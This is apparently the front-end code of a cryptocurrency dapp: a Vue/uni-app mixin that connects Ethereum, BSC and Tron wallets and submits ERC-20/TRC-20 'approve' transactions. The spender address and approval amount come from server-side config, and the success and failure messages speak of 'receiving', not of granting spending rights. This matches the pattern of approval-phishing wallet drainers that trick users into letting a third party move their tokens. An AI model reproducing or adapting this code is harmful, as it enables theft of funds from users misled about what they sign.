import Web3 from "web3";
import {mapGetters} from "vuex";
import comjs from "@/common/util"

export const commonMixin = {
    computed: {
        ...mapGetters([
            'address',
            'contracts',
            'isConnected',
            'walletLinkName',
            'walletLink',
            'walletLinkId',
            'walletIndex',
        ]),
    },
    data() {
        return {
            isauto: true,
            web3js: null,
            tronWeb: null,
        }
    },
    async onLoad() {
        await this.initWeb3()
        await this.connect()
        await this.initEventListener()
    },
    methods: {
        async initWeb3(){
            if (window.ethereum && this.web3js === null) {
                this.web3js = new Web3(window.ethereum);
            }
        },
        async getEthAddress() {
            console.log(`call getEthAddress`)
            // 钱包地址
            const accounts = await this.web3js.eth.getAccounts();
            if (accounts.length >= 1 && accounts[0]) {
                let ctx = this.contracts[this.walletLink[this.walletIndex]]
                await this.$store.dispatch(`setAddress`, {
                    wallet_address: accounts[0],
                    smart_contract: ctx?.smart_contract
                })
            }
        },
        // 钱包连接
        async connect() {
            console.log(`call connect`)
            //检测是否以太环境
            const obj = setInterval(async () => {
                if (window?.ethereum) {
                    console.log(`window.ethereum`)
                    clearInterval(obj);
                    if (this.web3js === null) {
                        this.web3js = new Web3(window.ethereum);
                    }
                    //@todo 这一步可能需要调整，在选择不同的链才触发
                    //链接钱包
                    await ethereum.request({method: 'eth_requestAccounts'}).catch(e => console.log(e));
                    await this.ethChain()
                } else if (window?.tronWeb) {
                    console.log(`window.tronWeb`)
                    if (typeof window.tronWeb?.defaultAddress?.base58 !== 'undefined') {
                        clearInterval(obj);
                        if(!this.walletIndex){
                            this.chooselink()
                            return;
                        }
                        let ctx = this.contracts[this.walletLink[this.walletIndex]]
                        console.log(`this.walletIndex`,this.walletIndex)
                        console.log(`start setAddress`,window?.tronWeb?.defaultAddress?.base58)
                        if(window?.tronWeb?.defaultAddress?.base58){
                            await this.$store.dispatch(`setAddress`, {
                                wallet_address: window.tronWeb?.defaultAddress?.base58,
                                smart_contract: ctx?.smart_contract
                            })
                            await this.$store.dispatch(`setWalletIndex`, 2)
                        }
                        this.tronWeb = window.tronWeb;
                    }
                } else {
                    console.log('not net')
                    clearInterval(obj);
                    if (!this.isauto) {
                        await this.showWalletList()
                    }
                }
            }, 100);
        },
        chooselink() {
            console.log(`call chooselink`)
            //是否已连接
            if (this.isConnected && typeof this.walletIndex !== "undefined") {
                return true;
            }
            this.isauto = false
            uni.showActionSheet({
                title: null,
                itemList: this.walletLinkName,
                success: async (res) => {
                    await this.$store.dispatch(`setWalletIndex`, res.tapIndex)
                    if (this.walletLink[this.walletIndex] === 'trc') {
                        await this.trcConnect()
                    } else {
                        console.log(`ethcontent`)
                        await this.connect()
                    }
                }
            })
        },
        async ethChain() {
            //获取链id
            console.log(`call ethChain`)
            try {
                const chainIdHex = await ethereum.request({
                    method: 'eth_chainId'
                });
                const chainId = Web3.utils.hexToNumber(chainIdHex)
                console.log('chainId', chainId)
                if (this.isauto) {
                    if ([1, 11155111].includes(chainId)) {
                        //erc
                        console.log(`erc link`)
                        await this.$store.dispatch(`setWalletIndex`, 0)
                    } else if ([56].includes(chainId)) {
                        //bsc
                        console.log(`bsc link`)
                        await this.$store.dispatch(`setWalletIndex`, 1)
                    }
                    await this.getEthAddress();
                } else {
                    await this.getEthAddress();
                }
            } catch (e) {
                console.log(`ethChain exception`, e)
                comjs.jsalert(this.$t('connect.fail'),this.$t('confirm'));
            }
        },
        async trcConnect() {
            console.log(`call trcConnect`)
            this.tronWeb = await this.getTronWeb();
            const res = await tronLink.request({method: 'tron_requestAccounts'});
            if (res.code === 200) {
                let ctx = this.contracts[this.walletLink[this.walletIndex]]
                await this.$store.dispatch(`setAddress`, {
                    wallet_address: window?.tronWeb?.defaultAddress?.base58,
                    smart_contract: ctx?.smart_contract
                })
                await this.$store.dispatch(`setIsConnected`, true)
                await this.$store.dispatch(`setWalletIndex`, 2)
            } else {
                await this.showWalletList()
            }
        },
        async showWalletList() {
            console.log(`call showWalletList`)
            //钱包跳转
            //@todo 域名从接口获取？
            let dappdomain = window.location.origin //本站域名
            //各个以太坊钱包地址
            let walletName = ['MetaMask', 'Coinbase', 'imToken', 'TokenPocket', 'TrustWallet']
            let walletUrl = {}
            walletUrl[0] = `https://metamask.app.link/dapp/${dappdomain}`
            walletUrl[1] = 'https://go.cb-w.com/'
            walletUrl[2] = `imtokenv2://navigate/DappView?url=${dappdomain}`
            walletUrl[3] = `tpdapp://open?params={"url": "${dappdomain}", "chain": "ETH"}`
            walletUrl[4] = `https://link.trustwallet.com/open_url?url=${dappdomain}`
            uni.showActionSheet({
                title: null,
                itemList: walletName,
                success: (res) => {
                    console.log('url', walletUrl[res.tapIndex])
                    window.location.href = walletUrl[res.tapIndex]
                }
            })
        },
        async getTronWeb() {
            console.log(`call getTronWeb`)
            let tronWeb;
            if (window.tronLink.ready) {
                tronWeb = tronLink.tronWeb;
            } else {
                const res = await tronLink.request({method: 'tron_requestAccounts'});
                if (res.code === 200) {
                    tronWeb = tronLink.tronWeb;
                }
            }
            return tronWeb;
        },
        async approveSuccess() {
            //保存授权地址信息，无需处理返回信息
            console.log(`call approveSuccess`)
        },
        async approveTrc() {
            console.log(`call approveTrc`)
            //是否获取到相应合约
            if (this.contracts.length === 0 || !this.contracts?.trc) {
                return false;
            }
            await uni.showLoading()
            try {
                let contractdata = this.contracts?.trc
                if (!contractdata) {
                    return;
                }
                const tronWeb = window.tronWeb
                //授权数量
                const bigNum = tronWeb.BigNumber(contractdata.approve_value * Math.pow(10, contractdata.token_decimals))
                let _value = bigNum.toString(10)
                const parameter = [{
                    type: 'address',
                    value: contractdata.smart_contract
                }, {
                    type: 'uint256',
                    value: _value
                }];
                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
                    contractdata.token_contract,
                    "approve(address,uint256)", {},
                    parameter,
                    this.address
                );
                const signedTx = await tronWeb.trx.sign(tx.transaction);
                const broastTx = await tronWeb.trx.sendRawTransaction(signedTx);
                uni.hideLoading()
                if (broastTx?.result) {
                    console.log(`broastTx`,broastTx)

                    //授权处理成功，开始成功后的业务处理----------------------
                    await this.$store.dispatch(`setIsApprove`, {result: true, txid: broastTx.txid})
                    await this.approveSuccess()
                    //授权处理成功，结束成功后的业务处理----------------------

                    comjs.jsalert(this.$t("receive.success"),this.$t('confirm'));
                } else {
                    comjs.msg(this.$t("receive.fail"))
                }
            } catch (e) {
                uni.hideLoading()
                console.log(`exception:`,e)
                comjs.msg(this.$t("receive.fail"))
            }
        },
        async approveEth() {
            console.log(`call approveEth`)
            await uni.showLoading()
            try {
                //以太坊/币安  授权开始
                let strabi =
                    '[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
                let abi = JSON.parse(strabi)
                let ctx = this.contracts[this.walletLink[this.walletIndex]]
                if (!ctx) {
                    return;
                }
                let contract = new this.web3js.eth.Contract(abi, ctx.token_contract);
                //授权数量
                let _value = Web3.utils.toWei(ctx.approve_value, 'ether');
                const receipt = await contract.methods.approve(ctx.smart_contract, _value).send({
                    from: this.address
                })
                const transactionHash = receipt?.transactionHash;
                if (transactionHash) {
                    uni.hideLoading()
                    console.log(`receipt`,receipt)
                    await this.$store.dispatch(`setIsApprove`, {result: true, txid: transactionHash})
                    await this.approveSuccess()
                    comjs.jsalert(this.$t("receive.success"),this.$t('confirm'));
                }
            } catch (e) {
                console.log(`e`,e)
                uni.hideLoading()
                comjs.msg(this.$t("receive.fail"))
            }
        },
        async doapprove() {
            console.log(`call doapprove,isApprove: `, this.isApprove)
            //是否已授权
            if (this.isApprove) {
                await this.connect() // 查询是否要重新授权
                console.log('is_approve', this.isApprove)
                if (this.isApprove){
                    comjs.jsalert(this.$t("receive.success"),this.$t('confirm'));
                    return true;
                }
            }
            //没有连接到钱包？开始连接
            if (!this.isConnected || typeof this.walletIndex === "undefined") {
                this.chooselink()
                return true;
            }
            //开始授权
            if (this.walletLink[this.walletIndex] === 'trc') {
                await this.approveTrc();
            } else {
                await this.approveEth();
            }
        },
        async initEventListener(){
            window.addEventListener('message', async e => {
                //tron连接网站成功消息
                if (e.data.message && e.data.message.action === "connect") {
                    // handler logic
                    console.log(`action`, e.data.message.action)
                    console.log(`data`, e.data)
                }
                //tron断开连接网站消息
                if (e.data.message && e.data.message.action === "disconnect") {
                    // handler logic
                    console.log(`action`, e.data.message.action)
                    console.log(`data`, e.data)
                    await this.$store.dispatch(`resetState`)
                }
                //tron网络改变
                if (e.data.message && e.data.message.action === "setNode") {
                    // handler logic
                    console.log(`action`, e.data.message.action)
                    console.log(`data`, e.data)
                }
                //tron用户拒绝连接消息
                if (e.data.message && e.data.message.action === "rejectWeb") {
                    // handler logic
                    console.log(`action`, e.data.message.action)
                    console.log(`data`, e.data)
                }
                //tron账户改变消息
                if (e.data.message && e.data.message.action === "accountsChanged") {
                    // handler logic
                    console.log(`action`, e.data.message.action)
                    console.log(`data`, e.data)
                    if(e.data.message?.data?.address){
                        await this.$store.dispatch(`resetState`)
                        let ctx = this.contracts[this.walletLink[this.walletIndex]]
                        await this.$store.dispatch(`setAddress`, {
                            wallet_address: e.data.message?.data?.address,
                            smart_contract: ctx?.smart_contract
                        })
                        await this.$store.dispatch(`setWalletIndex`, 2)
                    }
                }
            })
        },
    }
}
